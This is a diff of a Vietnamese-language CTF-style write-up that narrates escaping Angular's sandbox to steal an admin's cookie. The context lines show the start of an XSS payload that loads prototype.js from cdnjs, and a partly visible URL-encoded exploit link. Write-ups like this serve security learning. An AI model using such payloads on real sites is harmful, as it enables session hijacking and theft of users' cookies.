@@ -49,7 +49,8 @@ Nhưng đời lại không như mơ... Hình như bị sandbox nên mình không
 
 ![[Pasted image 20261013111244.png]]
 
-Sau đó mình tìm mãi mới được cách để thoát ra khỏi Sandbox của Angular và thành công lấy được cookie của Admin 😭
+
+Sau đó mình tìm mãi mới nhận ra lý do không đọc được cookie và tìm được cách để thoát ra khỏi Sandbox của Angular sau đó thành công lấy được cookie của Admin 😭
 Payload:
 ```html
 <script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
@@ -64,4 +65,4 @@ http://web/index.php?msg=%3Cscript%20src%3D%22https%3A%2F%2Fcdnjs.cloudflare.com
 ```
 
 
-![[Pasted image 20261013112043.png]]
+![[Pasted image 20261013112459.png]]
